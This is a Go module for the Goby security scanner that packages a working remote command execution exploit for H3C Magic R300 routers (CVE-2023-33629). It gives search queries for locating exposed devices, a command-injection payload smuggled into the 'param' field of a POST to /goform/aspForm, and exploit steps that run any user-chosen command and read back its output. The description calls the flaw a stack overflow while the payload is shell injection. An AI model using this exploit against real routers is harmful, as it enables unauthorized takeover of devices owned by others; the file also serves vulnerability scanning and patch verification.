package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "H3C Magic R300-2100M /goform/aspForm remote command execution vulnerability (CVE-2023-33629)",
    "Description": "<p>H3C Magic R300 is a wireless router made by China's H3C Corporation. A stack overflow vulnerability contained in H3C Magic R300 version R300-2100MV100R004. The vulnerability occurs at /goform/aspForm through the DeltriggerList interface.</p>",
    "Product": "H3C-Ent-Router",
    "Homepage": "https://www.h3c.com/cn/",
    "DisclosureDate": "2023-07-20",
    "PostTime": "2024-03-20",
    "Author": "rongzheng@baimaohui.net",
    "FofaQuery": "header=\"Server: H3C-Miniware-Webs\" && title=\"系统管理\"",
    "GobyQuery": "header=\"Server: H3C-Miniware-Webs\" && title=\"系统管理\"",
    "Level": "2",
    "Impact": "<p>A stack overflow vulnerability exists in the DeltriggerList interface of /goform/aspForm in H3C Magic R300 version R300-2100MV100R004, which may lead to remote execution of arbitrary code.</p>",
    "Recommendation": "<p>Users can refer to the security patches provided by the following manufacturers to fix this vulnerability:</p><p><a href=\"http://www.example.com\">https://www.h3c.com/</a></p><p>Patch for H3C Magic R300 stack overflow vulnerability (CNVD-2023-57673)</p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-33629"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "default,cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": "AttackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/goform/aspForm",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/aBcDeFgH);"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "do_cmd.asp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/aBcDeFgH",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "www",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "www_multi",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|{{{fixedhostinfo}}}",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/goform/aspForm"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/goform/aspForm",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $({{{cmd}}}>/www/aBcDeFgj);"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/aBcDeFgj",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-33629"
    ],
    "CNNVD": [
        "CNNVD-202305-2706"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "H3C Magic R300-2100M /goform/aspForm 远程命令执行漏洞（CVE-2023-33629）",
            "Product": "H3C-Ent-Router",
            "Description": "<p>H3C Magic R300是中国新华三（H3C）公司的一款无线路由器。H3C Magic R300版本R300-2100MV100R004中包含的堆栈溢出漏洞。该漏洞通过DeltriggerList接口在/goform/aspForm处发生。<br></p>",
            "Recommendation": "<p>用户可参考如下厂商提供的安全补丁以修复该漏洞：</p><p><a href=\"https://www.h3c.com/\">https://www.h3c.com/</a></p><p>H3C Magic R300堆栈溢出漏洞（CNVD-2023-57673）的补丁</p>",
            "Impact": "<p>H3C Magic R300 版本 R300-2100MV100R004 中的 /goform/aspForm 的 DeltriggerList 接口存在堆栈溢出漏洞，可能导致远程执行任意代码。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "H3C Magic R300-2100M /goform/aspForm remote command execution vulnerability (CVE-2023-33629)",
            "Product": "H3C-Ent-Router",
            "Description": "<p>H3C Magic R300 is a wireless router made by China's H3C Corporation. A stack overflow vulnerability contained in H3C Magic R300 version R300-2100MV100R004. The vulnerability occurs at /goform/aspForm through the DeltriggerList interface.<br></p>",
            "Recommendation": "<p>Users can refer to the security patches provided by the following manufacturers to fix this vulnerability:</p><p><a href=\"http://www.example.com\" target=\"_blank\">https://www.h3c.com/</a></p><p>Patch for H3C Magic R300 stack overflow vulnerability (CNVD-2023-57673)</p>",
            "Impact": "<p>A stack overflow vulnerability exists in the DeltriggerList interface of /goform/aspForm in H3C Magic R300 version R300-2100MV100R004, which may lead to remote execution of arbitrary code.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10936"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}